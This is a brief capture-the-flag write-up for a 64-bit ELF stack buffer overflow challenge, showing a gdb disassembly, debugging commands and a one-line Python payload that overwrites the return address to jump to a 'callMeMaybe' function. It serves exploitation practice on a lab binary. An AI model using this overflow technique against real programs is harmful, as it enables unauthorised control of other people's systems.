# ELFx64 writeup
Using gdb:

```sh
Dump of assembler code for function main:                              
   0x0000000000400628 <+0>:     push   rbp                             
   0x0000000000400629 <+1>:     mov    rbp,rsp                         
   0x000000000040062c <+4>:     sub    rsp,0x120                       
   0x0000000000400633 <+11>:    mov    DWORD PTR [rbp-0x114],edi       
   0x0000000000400639 <+17>:    mov    QWORD PTR [rbp-0x120],rsi       
   0x0000000000400640 <+24>:    lea    rax,[rbp-0x110]                 
   0x0000000000400647 <+31>:    mov    rsi,rax                         
   0x000000000040064a <+34>:    lea    rdi,[rip+0xd0]        # 0x400721
   0x0000000000400651 <+41>:    mov    eax,0x0                         
   0x0000000000400656 <+46>:    call   0x4004f0 <__isoc99_scanf@plt>   
   0x000000000040065b <+51>:    lea    rax,[rbp-0x110]                 
   0x0000000000400662 <+58>:    mov    rdi,rax                         
   0x0000000000400665 <+61>:    call   0x4004c0 <strlen@plt>           
   0x000000000040066a <+66>:    mov    DWORD PTR [rbp-0x4],eax         
   0x000000000040066d <+69>:    lea    rax,[rbp-0x110]                 
   0x0000000000400674 <+76>:    mov    rsi,rax                         
   0x0000000000400677 <+79>:    lea    rdi,[rip+0xa6]        # 0x400724
   0x000000000040067e <+86>:    mov    eax,0x0                         
   0x0000000000400683 <+91>:    call   0x4004d0 <printf@plt>           
   0x0000000000400688 <+96>:    mov    eax,0x0                         
   0x000000000040068d <+101>:   leave                                  
   0x000000000040068e <+102>:   ret                                    
End of assembler dump.                                                 
```

```sh
gdb ./ch35
(gdb) disas main
(gdb) break * main+46
(gdb) x/120x $rsp # this is to check the stack before
(gdb) x/120x $rsp # this is to check the stack after writing to the buffer
(gdb) print callMeMaybe # we need this address to use as our new return address
```

We see that 0x110 is allocated on the stack, then we need to add 8 more bytes (64 bit) to overwrite the $rbp register.

```sh
((python -c 'print("A"*280 "\xe7\x05\x40\x00\x00\x00\x00\x00")'); cat - ) | ./ch35
```
